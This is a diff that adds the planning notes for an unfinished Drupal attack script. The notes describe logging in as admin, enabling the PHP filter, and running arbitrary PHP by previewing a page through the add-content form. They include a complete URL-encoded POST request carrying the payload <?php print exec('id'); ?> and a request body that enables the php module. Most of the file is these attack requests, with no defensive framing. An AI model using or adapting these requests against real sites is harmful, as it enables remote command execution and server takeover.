@@ -1,0 +1,27 @@
+## useless drupal scrip
+### how:
+ - authenticates as admin
+ - <strike>enables php filter if not already enabled TODO on this one</strike>didn't/won't get there
+ - executes php by 'previewing' php pages via the admin 'add content' function
+
+### todo
+ - reset php filter to original state, and log out the new session
+
+### authn
+ - post params: name, pass
+ - post uri: /node
+ - authn success indicated by a set-cookie in the post response
+
+### php preview
+```
+POST /node/add/page
+<headers, including cookie>
+title=wew&body%5Bund%5D%5B0%5D%5Bsummary%5D=&body%5Bund%5D%5B0%5D%5Bvalue%5D=%3C%3Fphp%0D%0Aprint+exec%28%27id%27%29%3B%0D%0A%3F%3E&body%5Bund%5D%5B0%5D%5Bformat%5D=php_code&changed=&form_build_id=form--712SDx8IotnV8LNraHlXnNDY46D4SEGESaIC41AuHY&form_token=DHmYCQssjZScWVWesxts8-VzOQo86SB6C2khs9CSSAI&form_id=page_node_form&menu%5Blink_title%5D=&menu%5Bdescription%5D=&menu%5Bparent%5D=main-menu%3A0&menu%5Bweight%5D=0&log=&comment=1&path%5Balias%5D=&name=admin&date=&status=1&additional_settings__active_tab=edit-menu&op=Preview
+```
+
+### turning on php filter
+ - didn't do it
+ - need to get a list of modules, since this request sends all installed modules
+```
+modules%5BCore%5D%5Bcolor%5D%5Benable%5D=1&modules%5BCore%5D%5Bcomment%5D%5Benable%5D=1&modules%5BCore%5D%5Bcontextual%5D%5Benable%5D=1&modules%5BCore%5D%5Bdashboard%5D%5Benable%5D=1&modules%5BCore%5D%5Bdblog%5D%5Benable%5D=1&modules%5BCore%5D%5Bfield_ui%5D%5Benable%5D=1&modules%5BCore%5D%5Bhelp%5D%5Benable%5D=1&modules%5BCore%5D%5Blist%5D%5Benable%5D=1&modules%5BCore%5D%5Bmenu%5D%5Benable%5D=1&modules%5BCore%5D%5Bnumber%5D%5Benable%5D=1&modules%5BCore%5D%5Boverlay%5D%5Benable%5D=1&modules%5BCore%5D%5Bpath%5D%5Benable%5D=1&modules%5BCore%5D%5Bphp%5D%5Benable%5D=1&modules%5BCore%5D%5Brdf%5D%5Benable%5D=1&modules%5BCore%5D%5Bsearch%5D%5Benable%5D=1&modules%5BCore%5D%5Bshortcut%5D%5Benable%5D=1&modules%5BCore%5D%5Btoolbar%5D%5Benable%5D=1&form_build_id=form-CeI2aPM01ySv6-mWnBMczj87GxJjABAs4Qb55vRakYM&form_token=h94K0bcCgDFkne0SdJwzgdjPmrMyv9guwoPMpxlD0K0&form_id=system_modules&op=Save+configuration
+```
